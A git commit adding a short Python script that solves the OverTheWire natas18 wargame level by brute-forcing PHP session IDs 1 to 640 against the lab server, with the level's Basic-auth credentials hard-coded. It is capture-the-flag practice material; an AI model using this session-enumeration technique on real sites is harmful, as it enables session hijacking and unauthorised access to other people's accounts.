4fe63eddd135b32eb427e62ce737a78ccf8dea75
Ueli Kunz <kunz@ideadapt.net>
2019-02-06 22:42:36 +0100

    cracked natas19

---
+++ php-sess.natas18.py
@@ -0,0 +1,27 @@
+import re
+from base64 import b64encode
+from time import sleep
+
+import requests
+
+idx = 0
+pw = ''
+url = 'http://natas18.natas.labs.overthewire.org/index.php?debug'
+userAndPass = b64encode(b"natas18:xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP").decode("ascii")
+headers = {'Authorization': 'Basic %s' % userAndPass}
+
+
+def doRequest(username, sessionid):
+    res = requests.post(url, headers=headers, data={'username': username}, cookies={'PHPSESSID': str(sessionid)})
+    return res.text
+
+
+while idx < 640:
+    idx += 1
+    print("looking for %i" % idx)
+
+    text = doRequest('natas18', idx).splitlines()
+    debugs = [line for line in text if re.search(r'Password: ', line)]
+    print(debugs)
+
+    sleep(0.3)
